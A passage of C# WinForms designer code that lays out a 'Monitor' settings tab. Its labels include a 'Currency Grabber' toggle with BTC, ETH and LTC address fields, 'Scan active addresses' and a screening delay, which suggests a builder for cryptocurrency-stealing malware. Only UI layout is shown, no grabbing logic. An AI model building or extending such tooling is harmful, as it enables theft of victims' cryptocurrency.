        this.ImageIcon.Size = new System.Drawing.Size(66, 66);
        this.ImageIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.ImageIcon.TabIndex = 510;
        this.ImageIcon.TabStop = false;
        this.ImageIcon.Type = Bunifu.UI.WinForms.BunifuPictureBox.Types.Circle;
        // 
        // tabPage2Monitor
        // 
        this.tabPage2Monitor.Controls.Add(this.PanelMuneMonitor);
        this.tabPage2Monitor.Location = new System.Drawing.Point(4, 4);
        this.tabPage2Monitor.Name = "tabPage2Monitor";
        this.tabPage2Monitor.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage2Monitor.Size = new System.Drawing.Size(340, 602);
        this.tabPage2Monitor.TabIndex = 1;
        this.tabPage2Monitor.Text = "tabPage2";
        this.tabPage2Monitor.UseVisualStyleBackColor = true;
        // 
        // PanelMuneMonitor
        // 
        this.PanelMuneMonitor.Controls.Add(this.label30);
        this.PanelMuneMonitor.Controls.Add(this.label29);
        this.PanelMuneMonitor.Controls.Add(this.DelayMonitor);
        this.PanelMuneMonitor.Controls.Add(this.CloseMuneMonitor);
        this.PanelMuneMonitor.Controls.Add(this.label17);
        this.PanelMuneMonitor.Controls.Add(this.ScanActiveAddresses);
        this.PanelMuneMonitor.Controls.Add(this.pictureBox11);
        this.PanelMuneMonitor.Controls.Add(this.TlogCurrencyGrabber);
        this.PanelMuneMonitor.Controls.Add(this.label16);
        this.PanelMuneMonitor.Controls.Add(this.SaveMonitorData);
        this.PanelMuneMonitor.Controls.Add(this.PanelMonitorGrabber);
        this.PanelMuneMonitor.Controls.Add(this.PanelListScan);
        this.PanelMuneMonitor.Controls.Add(this.TitleMuneMonitor);
        this.PanelMuneMonitor.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelMuneMonitor.Location = new System.Drawing.Point(3, 3);
        this.PanelMuneMonitor.Name = "PanelMuneMonitor";
        this.PanelMuneMonitor.Size = new System.Drawing.Size(334, 596);
        this.PanelMuneMonitor.TabIndex = 666;
        // 
        // label30
        // 
        this.label30.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label30.AutoSize = true;
        this.label30.BackColor = System.Drawing.Color.Transparent;
        this.label30.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label30.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label30.ForeColor = System.Drawing.Color.Black;
        this.label30.Location = new System.Drawing.Point(121, 536);
        this.label30.Name = "label30";
        this.label30.Size = new System.Drawing.Size(45, 15);
        this.label30.TabIndex = 672;
        this.label30.Text = "second";
        // 
        // label29
        // 
        this.label29.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label29.AutoSize = true;
        this.label29.BackColor = System.Drawing.Color.Transparent;
        this.label29.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label29.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label29.ForeColor = System.Drawing.Color.Black;
        this.label29.Location = new System.Drawing.Point(15, 508);
        this.label29.Name = "label29";
        this.label29.Size = new System.Drawing.Size(224, 15);
        this.label29.TabIndex = 671;
        this.label29.Text = "The time between each screening session";
        // 
        // DelayMonitor
        // 
        this.DelayMonitor.AcceptsReturn = false;
        this.DelayMonitor.AcceptsTab = false;
        this.DelayMonitor.AnimationSpeed = 200;
        this.DelayMonitor.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.DelayMonitor.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.DelayMonitor.AutoSizeHeight = true;
        this.DelayMonitor.BackColor = System.Drawing.Color.Transparent;
        this.DelayMonitor.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("DelayMonitor.BackgroundImage")));
        this.DelayMonitor.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.DelayMonitor.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.DelayMonitor.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.DelayMonitor.BorderColorIdle = System.Drawing.Color.Silver;
        this.DelayMonitor.BorderRadius = 2;
        this.DelayMonitor.BorderThickness = 1;
        this.DelayMonitor.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.DelayMonitor.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.DelayMonitor.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.DelayMonitor.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.DelayMonitor.DefaultText = "30";
        this.DelayMonitor.FillColor = System.Drawing.Color.White;
        this.DelayMonitor.HideSelection = true;
        this.DelayMonitor.IconLeft = null;
        this.DelayMonitor.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.DelayMonitor.IconPadding = 10;
        this.DelayMonitor.IconRight = null;
        this.DelayMonitor.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.DelayMonitor.Lines = new string[] {
        "30"};
        this.DelayMonitor.Location = new System.Drawing.Point(20, 530);
        this.DelayMonitor.MaxLength = 32767;
        this.DelayMonitor.MinimumSize = new System.Drawing.Size(1, 1);
        this.DelayMonitor.Modified = false;
        this.DelayMonitor.Multiline = false;
        this.DelayMonitor.Name = "DelayMonitor";
        stateProperties41.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties41.FillColor = System.Drawing.Color.Empty;
        stateProperties41.ForeColor = System.Drawing.Color.Empty;
        stateProperties41.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.DelayMonitor.OnActiveState = stateProperties41;
        stateProperties42.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties42.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties42.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties42.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.DelayMonitor.OnDisabledState = stateProperties42;
        stateProperties43.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties43.FillColor = System.Drawing.Color.Empty;
        stateProperties43.ForeColor = System.Drawing.Color.Empty;
        stateProperties43.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.DelayMonitor.OnHoverState = stateProperties43;
        stateProperties44.BorderColor = System.Drawing.Color.Silver;
        stateProperties44.FillColor = System.Drawing.Color.White;
        stateProperties44.ForeColor = System.Drawing.Color.Empty;
        stateProperties44.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.DelayMonitor.OnIdleState = stateProperties44;
        this.DelayMonitor.Padding = new System.Windows.Forms.Padding(3);
        this.DelayMonitor.PasswordChar = '\0';
        this.DelayMonitor.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.DelayMonitor.PlaceholderText = "0";
        this.DelayMonitor.ReadOnly = false;
        this.DelayMonitor.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.DelayMonitor.SelectedText = "";
        this.DelayMonitor.SelectionLength = 0;
        this.DelayMonitor.SelectionStart = 0;
        this.DelayMonitor.ShortcutsEnabled = true;
        this.DelayMonitor.Size = new System.Drawing.Size(96, 28);
        this.DelayMonitor.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.DelayMonitor.TabIndex = 670;
        this.DelayMonitor.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.DelayMonitor.TextMarginBottom = 0;
        this.DelayMonitor.TextMarginLeft = 3;
        this.DelayMonitor.TextMarginTop = 1;
        this.DelayMonitor.TextPlaceholder = "0";
        this.DelayMonitor.UseSystemPasswordChar = false;
        this.DelayMonitor.WordWrap = true;
        this.DelayMonitor.KeyDown += new System.Windows.Forms.KeyEventHandler(this.DelayMonitor_KeyDown);
        this.DelayMonitor.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.DelayMonitor_KeyPress);
        // 
        // CloseMuneMonitor
        // 
        this.CloseMuneMonitor.Anchor = System.Windows.Forms.AnchorStyles.Top;
        this.CloseMuneMonitor.AutoSize = true;
        this.CloseMuneMonitor.Cursor = System.Windows.Forms.Cursors.Hand;
        this.CloseMuneMonitor.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.CloseMuneMonitor.Location = new System.Drawing.Point(304, 5);
        this.CloseMuneMonitor.Name = "CloseMuneMonitor";
        this.CloseMuneMonitor.Size = new System.Drawing.Size(16, 15);
        this.CloseMuneMonitor.TabIndex = 669;
        this.CloseMuneMonitor.Text = "X";
        this.CloseMuneMonitor.Click += new System.EventHandler(this.CloseMuneMonitor_Click);
        // 
        // label17
        // 
        this.label17.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label17.AutoSize = true;
        this.label17.BackColor = System.Drawing.Color.Transparent;
        this.label17.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label17.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label17.ForeColor = System.Drawing.Color.Black;
        this.label17.Location = new System.Drawing.Point(41, 276);
        this.label17.Name = "label17";
        this.label17.Size = new System.Drawing.Size(120, 15);
        this.label17.TabIndex = 657;
        this.label17.Text = "Scan active addresses";
        // 
        // ScanActiveAddresses
        // 
        this.ScanActiveAddresses.AllowBindingControlAnimation = true;
        this.ScanActiveAddresses.AllowBindingControlColorChanges = false;
        this.ScanActiveAddresses.AllowBindingControlLocation = true;
        this.ScanActiveAddresses.AllowCheckBoxAnimation = true;
        this.ScanActiveAddresses.AllowCheckmarkAnimation = true;
        this.ScanActiveAddresses.AllowOnHoverStates = true;
        this.ScanActiveAddresses.AutoCheck = true;
        this.ScanActiveAddresses.BackColor = System.Drawing.Color.Transparent;
        this.ScanActiveAddresses.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("ScanActiveAddresses.BackgroundImage")));
        this.ScanActiveAddresses.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.ScanActiveAddresses.BindingControl = this.label17;
        this.ScanActiveAddresses.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.ScanActiveAddresses.BorderRadius = 6;
        this.ScanActiveAddresses.Checked = false;
        this.ScanActiveAddresses.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.ScanActiveAddresses.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ScanActiveAddresses.CustomCheckmarkImage = null;
        this.ScanActiveAddresses.Location = new System.Drawing.Point(17, 272);
        this.ScanActiveAddresses.MinimumSize = new System.Drawing.Size(17, 17);
        this.ScanActiveAddresses.Name = "ScanActiveAddresses";
        this.ScanActiveAddresses.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScanActiveAddresses.OnCheck.BorderRadius = 6;
        this.ScanActiveAddresses.OnCheck.BorderThickness = 2;
        this.ScanActiveAddresses.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScanActiveAddresses.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.ScanActiveAddresses.OnCheck.CheckmarkThickness = 2;
        this.ScanActiveAddresses.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.ScanActiveAddresses.OnDisable.BorderRadius = 6;
        this.ScanActiveAddresses.OnDisable.BorderThickness = 2;
        this.ScanActiveAddresses.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ScanActiveAddresses.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.ScanActiveAddresses.OnDisable.CheckmarkThickness = 2;
        this.ScanActiveAddresses.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ScanActiveAddresses.OnHoverChecked.BorderRadius = 6;
        this.ScanActiveAddresses.OnHoverChecked.BorderThickness = 2;
        this.ScanActiveAddresses.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.ScanActiveAddresses.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.ScanActiveAddresses.OnHoverChecked.CheckmarkThickness = 2;
        this.ScanActiveAddresses.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.ScanActiveAddresses.OnHoverUnchecked.BorderRadius = 6;
        this.ScanActiveAddresses.OnHoverUnchecked.BorderThickness = 1;
        this.ScanActiveAddresses.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.ScanActiveAddresses.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.ScanActiveAddresses.OnUncheck.BorderRadius = 6;
        this.ScanActiveAddresses.OnUncheck.BorderThickness = 1;
        this.ScanActiveAddresses.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.ScanActiveAddresses.Size = new System.Drawing.Size(21, 21);
        this.ScanActiveAddresses.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.ScanActiveAddresses.TabIndex = 656;
        this.ScanActiveAddresses.ThreeState = false;
        this.ScanActiveAddresses.ToolTipText = null;
        this.ScanActiveAddresses.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.ScanActiveAddresses_CheckedChanged);
        // 
        // pictureBox11
        // 
        this.pictureBox11.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.pictureBox11.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox11.Image")));
        this.pictureBox11.Location = new System.Drawing.Point(181, 26);
        this.pictureBox11.Name = "pictureBox11";
        this.pictureBox11.Size = new System.Drawing.Size(147, 82);
        this.pictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox11.TabIndex = 652;
        this.pictureBox11.TabStop = false;
        // 
        // TlogCurrencyGrabber
        // 
        this.TlogCurrencyGrabber.AllowBindingControlAnimation = true;
        this.TlogCurrencyGrabber.AllowBindingControlColorChanges = false;
        this.TlogCurrencyGrabber.AllowBindingControlLocation = true;
        this.TlogCurrencyGrabber.AllowCheckBoxAnimation = true;
        this.TlogCurrencyGrabber.AllowCheckmarkAnimation = true;
        this.TlogCurrencyGrabber.AllowOnHoverStates = true;
        this.TlogCurrencyGrabber.AutoCheck = true;
        this.TlogCurrencyGrabber.BackColor = System.Drawing.Color.Transparent;
        this.TlogCurrencyGrabber.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TlogCurrencyGrabber.BackgroundImage")));
        this.TlogCurrencyGrabber.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.TlogCurrencyGrabber.BindingControl = this.label16;
        this.TlogCurrencyGrabber.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.TlogCurrencyGrabber.BorderRadius = 6;
        this.TlogCurrencyGrabber.Checked = false;
        this.TlogCurrencyGrabber.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.TlogCurrencyGrabber.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TlogCurrencyGrabber.CustomCheckmarkImage = null;
        this.TlogCurrencyGrabber.Location = new System.Drawing.Point(17, 119);
        this.TlogCurrencyGrabber.MinimumSize = new System.Drawing.Size(17, 17);
        this.TlogCurrencyGrabber.Name = "TlogCurrencyGrabber";
        this.TlogCurrencyGrabber.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TlogCurrencyGrabber.OnCheck.BorderRadius = 6;
        this.TlogCurrencyGrabber.OnCheck.BorderThickness = 2;
        this.TlogCurrencyGrabber.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TlogCurrencyGrabber.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.TlogCurrencyGrabber.OnCheck.CheckmarkThickness = 2;
        this.TlogCurrencyGrabber.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.TlogCurrencyGrabber.OnDisable.BorderRadius = 6;
        this.TlogCurrencyGrabber.OnDisable.BorderThickness = 2;
        this.TlogCurrencyGrabber.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.TlogCurrencyGrabber.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.TlogCurrencyGrabber.OnDisable.CheckmarkThickness = 2;
        this.TlogCurrencyGrabber.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TlogCurrencyGrabber.OnHoverChecked.BorderRadius = 6;
        this.TlogCurrencyGrabber.OnHoverChecked.BorderThickness = 2;
        this.TlogCurrencyGrabber.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TlogCurrencyGrabber.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.TlogCurrencyGrabber.OnHoverChecked.CheckmarkThickness = 2;
        this.TlogCurrencyGrabber.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TlogCurrencyGrabber.OnHoverUnchecked.BorderRadius = 6;
        this.TlogCurrencyGrabber.OnHoverUnchecked.BorderThickness = 1;
        this.TlogCurrencyGrabber.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.TlogCurrencyGrabber.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.TlogCurrencyGrabber.OnUncheck.BorderRadius = 6;
        this.TlogCurrencyGrabber.OnUncheck.BorderThickness = 1;
        this.TlogCurrencyGrabber.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.TlogCurrencyGrabber.Size = new System.Drawing.Size(21, 21);
        this.TlogCurrencyGrabber.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.TlogCurrencyGrabber.TabIndex = 639;
        this.TlogCurrencyGrabber.ThreeState = false;
        this.TlogCurrencyGrabber.ToolTipText = null;
        this.TlogCurrencyGrabber.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.TlogCurrencyGrabber_CheckedChanged);
        // 
        // label16
        // 
        this.label16.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label16.AutoSize = true;
        this.label16.BackColor = System.Drawing.Color.Transparent;
        this.label16.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label16.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label16.ForeColor = System.Drawing.Color.Black;
        this.label16.Location = new System.Drawing.Point(41, 123);
        this.label16.Name = "label16";
        this.label16.Size = new System.Drawing.Size(100, 15);
        this.label16.TabIndex = 638;
        this.label16.Text = "Currency Grabber";
        // 
        // SaveMonitorData
        // 
        this.SaveMonitorData.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.SaveMonitorData.Animated = true;
        this.SaveMonitorData.BorderRadius = 6;
        this.SaveMonitorData.CheckedState.Parent = this.SaveMonitorData;
        this.SaveMonitorData.CustomImages.Parent = this.SaveMonitorData;
        this.SaveMonitorData.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.SaveMonitorData.FillColor2 = System.Drawing.Color.Navy;
        this.SaveMonitorData.Font = new System.Drawing.Font("Segoe UI", 9.75F);
        this.SaveMonitorData.ForeColor = System.Drawing.Color.White;
        this.SaveMonitorData.HoverState.Parent = this.SaveMonitorData;
        this.SaveMonitorData.Location = new System.Drawing.Point(211, 553);
        this.SaveMonitorData.Name = "SaveMonitorData";
        this.SaveMonitorData.ShadowDecoration.Parent = this.SaveMonitorData;
        this.SaveMonitorData.Size = new System.Drawing.Size(109, 29);
        this.SaveMonitorData.TabIndex = 665;
        this.SaveMonitorData.Text = "OK";
        this.SaveMonitorData.Click += new System.EventHandler(this.SaveMonitorData_Click);
        // 
        // PanelMonitorGrabber
        // 
        this.PanelMonitorGrabber.Controls.Add(this.TextBTC);
        this.PanelMonitorGrabber.Controls.Add(this.TextETH);
        this.PanelMonitorGrabber.Controls.Add(this.TextLTC);
        this.PanelMonitorGrabber.Location = new System.Drawing.Point(12, 146);
        this.PanelMonitorGrabber.Name = "PanelMonitorGrabber";
        this.PanelMonitorGrabber.Size = new System.Drawing.Size(308, 113);
        this.PanelMonitorGrabber.TabIndex = 666;
        // 
        // TextBTC
        // 
        this.TextBTC.AcceptsReturn = false;
        this.TextBTC.AcceptsTab = false;
        this.TextBTC.AnimationSpeed = 200;
        this.TextBTC.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextBTC.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextBTC.AutoSizeHeight = true;
        this.TextBTC.BackColor = System.Drawing.Color.Transparent;
        this.TextBTC.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextBTC.BackgroundImage")));
        this.TextBTC.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextBTC.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextBTC.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextBTC.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextBTC.BorderRadius = 2;
        this.TextBTC.BorderThickness = 1;
        this.TextBTC.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextBTC.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextBTC.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBTC.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextBTC.DefaultText = "";
        this.TextBTC.FillColor = System.Drawing.Color.White;
        this.TextBTC.HideSelection = true;
        this.TextBTC.IconLeft = null;
        this.TextBTC.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBTC.IconPadding = 10;
        this.TextBTC.IconRight = null;
        this.TextBTC.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBTC.Lines = new string[0];
        this.TextBTC.Location = new System.Drawing.Point(3, 7);
        this.TextBTC.MaxLength = 32767;
        this.TextBTC.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextBTC.Modified = false;
        this.TextBTC.Multiline = false;
        this.TextBTC.Name = "TextBTC";
        stateProperties45.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties45.FillColor = System.Drawing.Color.Empty;
        stateProperties45.ForeColor = System.Drawing.Color.Empty;
        stateProperties45.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBTC.OnActiveState = stateProperties45;
        stateProperties46.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties46.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties46.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties46.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextBTC.OnDisabledState = stateProperties46;
        stateProperties47.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties47.FillColor = System.Drawing.Color.Empty;
        stateProperties47.ForeColor = System.Drawing.Color.Empty;
        stateProperties47.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBTC.OnHoverState = stateProperties47;
        stateProperties48.BorderColor = System.Drawing.Color.Silver;
        stateProperties48.FillColor = System.Drawing.Color.White;
        stateProperties48.ForeColor = System.Drawing.Color.Empty;
        stateProperties48.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextBTC.OnIdleState = stateProperties48;
        this.TextBTC.Padding = new System.Windows.Forms.Padding(3);
        this.TextBTC.PasswordChar = '\0';
        this.TextBTC.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextBTC.PlaceholderText = "BTC Address";
        this.TextBTC.ReadOnly = false;
        this.TextBTC.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextBTC.SelectedText = "";
        this.TextBTC.SelectionLength = 0;
        this.TextBTC.SelectionStart = 0;
        this.TextBTC.ShortcutsEnabled = true;
        this.TextBTC.Size = new System.Drawing.Size(300, 28);
        this.TextBTC.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextBTC.TabIndex = 653;
        this.TextBTC.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextBTC.TextMarginBottom = 0;
        this.TextBTC.TextMarginLeft = 3;
        this.TextBTC.TextMarginTop = 1;
        this.TextBTC.TextPlaceholder = "BTC Address";
        this.TextBTC.UseSystemPasswordChar = false;
        this.TextBTC.WordWrap = true;
        // 
        // TextETH
        // 
        this.TextETH.AcceptsReturn = false;
        this.TextETH.AcceptsTab = false;
        this.TextETH.AnimationSpeed = 200;
        this.TextETH.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextETH.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextETH.AutoSizeHeight = true;
        this.TextETH.BackColor = System.Drawing.Color.Transparent;
        this.TextETH.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("TextETH.BackgroundImage")));
        this.TextETH.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.TextETH.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.TextETH.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.TextETH.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextETH.BorderRadius = 2;
        this.TextETH.BorderThickness = 1;
        this.TextETH.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.TextETH.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextETH.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextETH.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.TextETH.DefaultText = "";
        this.TextETH.FillColor = System.Drawing.Color.White;
        this.TextETH.HideSelection = true;
        this.TextETH.IconLeft = null;
        this.TextETH.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextETH.IconPadding = 10;
        this.TextETH.IconRight = null;
        this.TextETH.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextETH.Lines = new string[0];
        this.TextETH.Location = new System.Drawing.Point(3, 41);
        this.TextETH.MaxLength = 32767;
        this.TextETH.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextETH.Modified = false;
        this.TextETH.Multiline = false;
        this.TextETH.Name = "TextETH";
        stateProperties49.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties49.FillColor = System.Drawing.Color.Empty;
        stateProperties49.ForeColor = System.Drawing.Color.Empty;
        stateProperties49.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextETH.OnActiveState = stateProperties49;
        stateProperties50.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties50.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties50.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties50.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextETH.OnDisabledState = stateProperties50;
        stateProperties51.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties51.FillColor = System.Drawing.Color.Empty;
        stateProperties51.ForeColor = System.Drawing.Color.Empty;
        stateProperties51.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextETH.OnHoverState = stateProperties51;
        stateProperties52.BorderColor = System.Drawing.Color.Silver;
